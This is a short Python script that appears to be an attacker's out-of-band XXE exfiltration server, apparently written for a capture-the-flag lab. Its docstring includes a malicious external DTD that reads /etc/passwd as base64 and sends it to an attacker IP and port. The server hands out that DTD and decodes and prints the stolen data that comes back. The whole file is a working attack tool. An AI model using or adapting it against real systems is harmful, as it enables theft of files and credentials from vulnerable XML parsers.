#!/usr/bin/env python3
"""
Usage::
    ./server.py [<port>]
exfiltration.xml::
  <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % param1 "<!ENTITY thefile SYSTEM 'http://10.10.14.15:9001/%data;'>">
"""
from http.server import BaseHTTPRequestHandler, HTTPServer,test
import logging,base64

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        if "exfiltration.xml" not in str(self.path):
            #print("OK")
            xxe = str(self.path).replace("/","")
            try:
                result = base64.b64decode(xxe).decode('ascii')
                print(result)
            except:
                print("error")
        else:
            print("exfiltration.xml in url - passing away")
        self._set_response()
        with open('./exfiltration.xml', 'rb') as file:
            self.wfile.write(file.read())

    def log_message(self, format, *args):
        return
def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.CRITICAL)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
